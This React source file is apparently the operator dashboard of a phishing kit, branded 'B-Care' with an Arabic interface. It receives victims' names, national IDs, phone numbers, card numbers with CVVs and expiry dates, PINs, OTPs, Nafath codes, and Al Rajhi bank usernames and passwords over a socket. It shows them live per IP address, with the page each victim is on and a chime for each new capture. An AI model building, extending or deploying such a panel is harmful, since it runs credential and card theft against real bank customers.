// src/App.js - Enhanced Dashboard with Modern UI/UX
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";

// SVG Icons
const Icons = {
  Dashboard: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6A2.25 2.25 0 016 3.75h2.25A2.25 2.25 0 0110.5 6v2.25a2.25 2.25 0 01-2.25 2.25H6a2.25 2.25 0 01-2.25-2.25V6zM3.75 15.75A2.25 2.25 0 016 13.5h2.25a2.25 2.25 0 012.25 2.25V18a2.25 2.25 0 01-2.25 2.25H6A2.25 2.25 0 013.75 18v-2.25zM13.5 6a2.25 2.25 0 012.25-2.25H18A2.25 2.25 0 0120.25 6v2.25A2.25 2.25 0 0118 10.5h-2.25a2.25 2.25 0 01-2.25-2.25V6zM13.5 15.75a2.25 2.25 0 012.25-2.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-2.25A2.25 2.25 0 0113.5 18v-2.25z" />
    </svg>
  ),
  Users: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M15 19.128a9.38 9.38 0 002.625.372 9.337 9.337 0 004.121-.952 4.125 4.125 0 00-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 018.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0111.964-3.07M12 6.375a3.375 3.375 0 11-6.75 0 3.375 3.375 0 016.75 0zm8.25 2.25a2.625 2.625 0 11-5.25 0 2.625 2.625 0 015.25 0z" />
    </svg>
  ),
  Settings: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.324.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 011.37.49l1.296 2.247a1.125 1.125 0 01-.26 1.431l-1.003.827c-.293.24-.438.613-.431.992a6.759 6.759 0 010 .255c-.007.378.138.75.43.99l1.005.828c.424.35.534.954.26 1.43l-1.298 2.247a1.125 1.125 0 01-1.369.491l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.57 6.57 0 01-.22.128c-.331.183-.581.495-.644.869l-.213 1.28c-.09.543-.56.941-1.11.941h-2.594c-.55 0-1.02-.398-1.11-.94l-.213-1.281c-.062-.374-.312-.686-.644-.87a6.52 6.52 0 01-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 01-1.369-.49l-1.297-2.247a1.125 1.125 0 01.26-1.431l1.004-.827c.292-.24.437-.613.43-.992a6.932 6.932 0 010-.255c.007-.378-.138-.75-.43-.99l-1.004-.828a1.125 1.125 0 01-.26-1.43l1.297-2.247a1.125 1.125 0 011.37-.491l1.216.456c.356.133.751.072 1.076-.124.072-.044.146-.087.22-.128.332-.183.582-.495.644-.869l.214-1.281z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
    </svg>
  ),
  Logout: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75" />
    </svg>
  ),
  Search: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
    </svg>
  ),
  Bell: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M14.857 17.082a23.848 23.848 0 005.454-1.31A8.967 8.967 0 0118 9.75v-.7V9A6 6 0 006 9v.75a8.967 8.967 0 01-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 01-5.714 0m5.714 0a3 3 0 11-5.714 0" />
    </svg>
  ),
  Online: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
    </svg>
  ),
  UsersTotal: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M18 18.72a9.094 9.094 0 003.741-.479 3 3 0 00-4.682-2.72m.94 3.198l.001.031c0 .225-.012.447-.037.666A11.944 11.944 0 0112 21c-2.17 0-4.207-.576-5.963-1.584A6.062 6.062 0 016 18.719m12 0a5.971 5.971 0 00-.941-3.197m0 0A5.995 5.995 0 0012 12.75a5.995 5.995 0 00-5.058 2.772m0 0a3 3 0 00-4.681 2.72 8.986 8.986 0 003.74.477m.94-3.197a5.971 5.971 0 00-.94 3.197M15 6.75a3 3 0 11-6 0 3 3 0 016 0zm6 3a2.25 2.25 0 11-4.5 0 2.25 2.25 0 014.5 0zm-13.5 0a2.25 2.25 0 11-4.5 0 2.25 2.25 0 014.5 0z" />
    </svg>
  ),
  Alert: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
    </svg>
  ),
  Chart: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M3 13.125C3 12.504 3.504 12 4.125 12h2.25c.621 0 1.125.504 1.125 1.125v6.75C7.5 20.496 6.996 21 6.375 21h-2.25A1.125 1.125 0 013 19.875v-6.75zM9.75 8.625c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125v11.25c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V8.625zM16.5 4.125c0-.621.504-1.125 1.125-1.125h2.25C20.496 3 21 3.504 21 4.125v15.75c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V4.125z" />
    </svg>
  ),
  View: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
    </svg>
  ),
  Eye: () => (
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
    </svg>
  ),
};

export default function App() {
  const [users, setUsers] = useState({});
  const [cardIp, setCardIp] = useState(null);
  const [infoIp, setInfoIp] = useState(null);
  const [highlightIp, setHighlightIp] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");

  // Sound effect
  const updateSound = useRef();
  const navigate = useNavigate();

  // Filtered users based on search
  const filteredUsers = Object.entries(users).filter(([ip, user]) => {
    if (!searchQuery) return true;
    const query = searchQuery.toLowerCase();
    return (
      user.name?.toLowerCase().includes(query) ||
      user.nationalID?.toLowerCase().includes(query) ||
      user.phoneNumber?.includes(query) ||
      ip.includes(query)
    );
  });

  useEffect(() => {
    updateSound.current = new Audio("/sounds/new-data.wav");

    (async () => {
      const token = localStorage.getItem("token");
      if (!token) {
        navigate("/login", { replace: true });
        return;
      }

      socket.connect();
      socket.emit("loadData");

      socket.on("initialData", (data) => {
        const keepToken = localStorage.getItem("token");
        localStorage.clear();
        if (keepToken) localStorage.setItem("token", keepToken);

        const map = {};

        Object.entries(data).forEach(([key, arr]) => {
          if (
            key === "payment" ||
            key === "flags" ||
            key === "locations" ||
            key === "newDates" ||
            key === "rajhi"
          )
            return;

          arr.forEach((r) => {
            const ipKey = r.ip;
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey] = {
              ...map[ipKey],
              ...r,
              payments: map[ipKey].payments,
              flag: map[ipKey].flag,
              hasNewData: false,
              hasPayment: map[ipKey].hasPayment,
            };
          });
        });

        if (data.payment) {
          data.payment.forEach((payDoc) => {
            const ipKey = payDoc.ip;
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].payments.push(payDoc);
            map[ipKey].hasPayment = true;
          });
        }

        if (data.flags) {
          data.flags.forEach(({ ip: ipKey, flag }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].flag = flag;
          });
        }

        if (data.locations) {
          data.locations.forEach(({ ip: ipKey, currentPage }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].currentPage = currentPage;
          });
        }

        if (data.newDates) {
          data.newDates.forEach(
            ({
              ip: ipKey,
              name,
              nationalID,
              phoneNumber,
              email,
              nationality,
              countryOfRegistration,
              region,
            }) => {
              if (!map[ipKey]) {
                map[ipKey] = {
                  payments: [],
                  flag: false,
                  hasNewData: false,
                  hasPayment: false,
                };
              }
              map[ipKey] = {
                ...map[ipKey],
                name: name ?? map[ipKey].name,
                nationalID: nationalID ?? map[ipKey].nationalID,
                phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
                email: email ?? map[ipKey].email,
                nationality: nationality ?? map[ipKey].nationality,
                countryOfRegistration:
                  countryOfRegistration ?? map[ipKey].countryOfRegistration,
                region: region ?? map[ipKey].region,
              };
            }
          );
        }

        if (data.rajhi) {
          data.rajhi.forEach(({ ip: ipKey, username, password }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey] = {
              ...map[ipKey],
              rajhiUsername: username ?? map[ipKey].rajhiUsername,
              rajhiPassword: password ?? map[ipKey].rajhiPassword,
            };
          });
        }

        setUsers(map);
      });

      const playNewDataSound = () => {
        try {
          updateSound.current && updateSound.current.play();
        } catch {
          // ignore autoplay errors
        }
      };

      const mergeData = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };

          playNewDataSound();

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: true,
              hasPayment: oldObj.hasPayment || u.hasPayment === true,
            },
          };
        });
      };

      const mergeSilent = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };
          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: oldObj.hasNewData,
              hasPayment: oldObj.hasPayment,
            },
          };
        });
      };

      const appendPayment = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };

          const dup = oldObj.payments.some((p) => {
            if (u._id && p._id) return p._id === u._id;
            return (
              p.cardHolderName === u.cardHolderName &&
              p.cardNumber === u.cardNumber &&
              p.expirationDate === u.expirationDate &&
              p.cvv === u.cvv
            );
          });
          if (dup) return m;

          playNewDataSound();

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: [...oldObj.payments, u],
              flag: oldObj.flag,
              hasNewData: true,
              hasPayment: true,
            },
          };
        });
      };

      const removeUser = ({ ip }) =>
        setUsers((m) => {
          const copy = { ...m };
          delete copy[ip];
          return copy;
        });

      const updateFlag = ({ ip, flag }) =>
        setUsers((m) => ({
          ...m,
          [ip]: {
            ...(m[ip] || {
              payments: [],
              flag: false,
              hasNewData: false,
              hasPayment: false,
            }),
            flag,
          },
        }));

      socket.on("newIndex", (u) => mergeData(u));
      socket.on("newDetails", (u) => mergeData(u));
      socket.on("newShamel", (u) => mergeData(u));
      socket.on("newThirdparty", (u) => mergeData(u));
      socket.on("newBilling", (u) => mergeData(u));
      socket.on("newPayment", (u) => appendPayment(u));
      socket.on("newPhone", (u) => mergeData(u));
      socket.on("newPin", (u) => mergeData(u));
      socket.on("newOtp", (u) => mergeData(u));
      socket.on("newPhoneCode", (u) => mergeData(u));
      socket.on("newNafad", (u) => mergeData(u));
      socket.on("newNewDate", (r) => mergeData(r));
      socket.on("newRajhi", (u) =>
        mergeData({
          ip: u.ip,
          rajhiUsername: u.username,
          rajhiPassword: u.password,
        })
      );

      socket.on("locationUpdated", ({ ip, page }) => {
        if (page !== "offline") {
          mergeSilent({ ip, currentPage: page });
        } else {
          setUsers((m) => {
            if (!m[ip]) return m;
            return {
              ...m,
              [ip]: {
                ...m[ip],
                currentPage: "offline",
              },
            };
          });
        }
      });

      socket.on("userDeleted", removeUser);
      socket.on("flagUpdated", updateFlag);
    })();
  }, [navigate]);

  const handleShowCard = (ip) => {
    setHighlightIp(null);
    setCardIp(ip);

    setUsers((m) => {
      if (!m[ip]) return m;
      return {
        ...m,
        [ip]: {
          ...m[ip],
          hasNewData: false,
        },
      };
    });
  };

  const handleLogout = () => {
    localStorage.removeItem("token");
    socket.disconnect();
    navigate("/login", { replace: true });
  };

  // Calculate stats
  const totalUsers = Object.keys(users).length;
  const onlineUsers = Object.values(users).filter(
    (u) => u.currentPage && u.currentPage !== "offline"
  ).length;
  const newDataUsers = Object.values(users).filter((u) => u.hasNewData).length;
  const paidUsers = Object.values(users).filter((u) => u.hasPayment).length;

  return (
    <Routes>
      <Route path="/login" element={<Login />} />
      <Route
        path="/"
        element={
          localStorage.getItem("token") ? (
            <div className="app-layout">
              {/* Sidebar */}
              <aside className={`sidebar ${sidebarOpen ? "open" : ""}`}>
                <div className="sidebar-header">
                  <div className="sidebar-logo">
                    <div className="sidebar-logo-icon">B</div>
                    <span>B-Care</span>
                  </div>
                </div>

                <nav className="sidebar-nav">
                  <div className="nav-section">
                    <div className="nav-section-title">القائمة الرئيسية</div>
                    <div className="nav-item active">
                      <Icons.Dashboard />
                      <span>لوحة التحكم</span>
                    </div>
                    <div className="nav-item">
                      <Icons.Users />
                      <span>المستخدمين</span>
                    </div>
                    <div className="nav-item">
                      <Icons.Chart />
                      <span>التقارير</span>
                    </div>
                  </div>

                  <div className="nav-section">
                    <div className="nav-section-title">الإعدادات</div>
                    <div className="nav-item">
                      <Icons.Settings />
                      <span>إعدادات النظام</span>
                    </div>
                  </div>
                </nav>

                <div className="sidebar-footer">
                  <button className="logout-btn" onClick={handleLogout}>
                    <Icons.Logout />
                    <span>تسجيل الخروج</span>
                  </button>
                </div>
              </aside>

              {/* Main Content */}
              <main className="main-content">
                {/* Header */}
                <header className="top-header">
                  <div className="header-search">
                    <Icons.Search />
                    <input
                      type="text"
                      placeholder="البحث بالاسم، رقم الهوية، رقم الهاتف، أو IP..."
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                    />
                  </div>

                  <div className="header-actions">
                    <button className="notification-btn">
                      <Icons.Bell />
                      {newDataUsers > 0 && (
                        <span className="notification-badge">{newDataUsers}</span>
                      )}
                    </button>

                    <div className="user-profile">
                      <div className="user-avatar">أد</div>
                      <div className="user-info">
                        <div className="user-name">المسؤول</div>
                        <div className="user-role">مدير النظام</div>
                      </div>
                    </div>
                  </div>
                </header>

                {/* Dashboard Content */}
                <div className="dashboard-content">
                  <h1 className="page-title">لوحة التحكم</h1>
                  <p className="page-subtitle">مراقبة وإدارة المستخدمين والمعاملات</p>

                  {/* Stats Grid */}
                  <div className="stats-grid">
                    <div className="stat-card">
                      <div className="stat-icon primary">
                        <Icons.UsersTotal />
                      </div>
                      <div className="stat-content">
                        <h3>{totalUsers}</h3>
                        <p>إجمالي المستخدمين</p>
                      </div>
                    </div>

                    <div className="stat-card">
                      <div className="stat-icon success">
                        <Icons.Online />
                      </div>
                      <div className="stat-content">
                        <h3>{onlineUsers}</h3>
                        <p>المستخدمين النشطين</p>
                      </div>
                    </div>

                    <div className="stat-card">
                      <div className="stat-icon warning">
                        <Icons.Alert />
                      </div>
                      <div className="stat-content">
                        <h3>{newDataUsers}</h3>
                        <p>طلبات جديدة</p>
                      </div>
                    </div>

                    <div className="stat-card">
                      <div className="stat-icon danger">
                        <Icons.Chart />
                      </div>
                      <div className="stat-content">
                        <h3>{paidUsers}</h3>
                        <p>مكتملة الدفع</p>
                      </div>
                    </div>
                  </div>

                  {/* Table Card */}
                  <div className="table-card">
                    <div className="table-header">
                      <div className="table-title">
                        <Icons.Users />
                        <span>قائمة المستخدمين</span>
                      </div>
                      <div className="table-actions">
                        <select className="filter-select">
                          <option value="all">جميع الحالات</option>
                          <option value="online">نشط فقط</option>
                          <option value="offline">غير نشط</option>
                          <option value="new">طلبات جديدة</option>
                          <option value="paid">مكتملة</option>
                        </select>
                      </div>
                    </div>

                    <UserTable
                      users={filteredUsers}
                      highlightIp={highlightIp}
                      cardIp={cardIp}
                      onShowCard={handleShowCard}
                      onShowInfo={setInfoIp}
                    />
                  </div>
                </div>

                {/* Modals */}
                {cardIp && (
                  <CardModal
                    ip={cardIp}
                    user={users[cardIp]}
                    onClose={() => setCardIp(null)}
                  />
                )}

                {infoIp && (
                  <InfoModal
                    ip={infoIp}
                    user={users[infoIp]}
                    onClose={() => setInfoIp(null)}
                  />
                )}
              </main>
            </div>
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
      <Route
        path="*"
        element={
          localStorage.getItem("token") ? (
            <Navigate to="/" replace />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
    </Routes>
  );
}
